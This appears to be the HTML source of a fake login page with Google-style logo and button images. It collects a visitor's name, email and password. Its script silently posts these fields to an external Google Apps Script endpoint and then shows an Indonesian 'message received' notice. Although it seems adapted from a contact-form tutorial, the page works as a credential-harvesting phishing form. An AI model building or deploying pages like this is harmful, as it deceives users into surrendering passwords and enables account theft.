<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
 <!-- boostrap css -->
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" 
 integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous" />
 <!-- boostrap css end -->

 <!-- bootstraap icons -->
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
 <!-- bootstrap icons end -->
    <title>LOGIN</title>
</head>
   <body style="background-color: #f7f6ff;">
    <!-- contact -->
<section id="contact">
<div class="container">
    <div class="row text-center mb-3">
        <div class="col">
        </div>
    </div>
    <div class="row justify-content-center">
        <div class="col-md-6">
                <div style="background-color: #f7f6ff;" class="justify-content-center text-center">
                <img src="googless.png" width="149px" height="130px">
            </div>
              <div class="alert alert-success alert-dismissible fade show d-none my-alert" role="alert">
                <strong>Terima Kasih!</strong> Pesan anda sudah kami terima.
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
              </div>
                <form name="juan-contact-form">
                    <div class="mb-3 ms-4 me-3 mt-5">
                      <i class="bi bi-person-fill" style="text-center">
                      <label for="name" class="form-label">Nama Lengkap</label>
                    </i>
                      <input type="text" class="form-control" style="background-color: #ffff;" id="name" placeholder="Enter your name"
                      aria-describedby="name" name="nama"/>
                    </div>
                    <div class="mb-3 ms-4 me-3 mt-3">
                      <i class="bi bi-envelope-at-fill">
                        <label for="email" class="form-label">Email</label>
                      </i>
                        <input type="email" class="form-control"  style="background-color: #ffffff;" id="email" placeholder="Enter your email"
                        aria-describedby="email" name="email">
                      </div>
                      <div class="mb-5 ms-4 me-3 mt-3 pb-2">
                        <i class="bi bi-key-fill">
                      <label for="password" class="form-label">Password</label>
                      <input type="password" class="form-control" style="background-color: #ffffff;" id="password" placeholder="Enter your password" name="password">
                        </i>
                    </div>
                     
                      <div class="mb-5 ms-5 pb-5">
                    <button type="submit" class="btn btn-success btn-kirim" style="border-radius: 10px;">kirim
                        <img src="icons8-google-48.png" width="20px" height="20px" class="ms-1 justify-content-center text-center">
                    </button>

                    <button class="btn btn-success btn-loading d-none" style="border-radius: 10px;" type="button" disabled>
                      <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
                      Loading...
                    </button>
                      </div>
                  </form>
            </div>
        </div>
    </div>
</div>
</section>
    <!-- contact end -->

    <!-- footer -->
<footer style="background-color:#f7f6ff" class="text-center pt-2 pb-1 mb-3">
    <p style="color: rgb(37, 62, 85);"> <i class="bi bi-person-fill"></i> created by <a href="https://www.instagram.com/juanckyaa/" style="color:  rgb(37, 62, 85);" class="fw-bold">Jcrlsky</p>
</footer>
    <!-- footer end -->

    <!-- boostrap js -->
    <script
      src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"
      integrity="sha384-oBqDVm
    Mz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3"
      crossorigin="anonymous"
    ></script>

    <script>
      const scriptURL = 'https://script.google.com/macros/s/AKfycbx2A5RlRN8CPIytEXsN34RD4dBCdIjdRbK6Ad1uqu_eXBFLWT9mxKn7DWsuJtb2OEkvvA/exec'
      const form = document.forms['juan-contact-form']
      const btnKirim = document.querySelector ('.btn-kirim')
      const btnLoading = document.querySelector ('.btn-loading')
      const myAlert = document.querySelector ('.my-alert')
    
      form.addEventListener('submit', e => {
        e.preventDefault()
        // tampilkan tombol loading hilangkan tombol kirim 
        btnLoading.classList.toggle ('d-none')
        btnKirim.classList.toggle ('d-none')
        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
          .then(response => {
            // tampilkan tombol kirim hilangkan tombol loading
            btnLoading.classList.toggle ('d-none')
            btnKirim.classList.toggle ('d-none')
            // tampilkan alert
            myAlert.classList.toggle ('d-none')
            // reset formnya
            form.reset ()
            console.log('Success!', response)
          })
          .catch(error => console.error('Error!', error.message))
      })
    </script>
  </body>
</html>
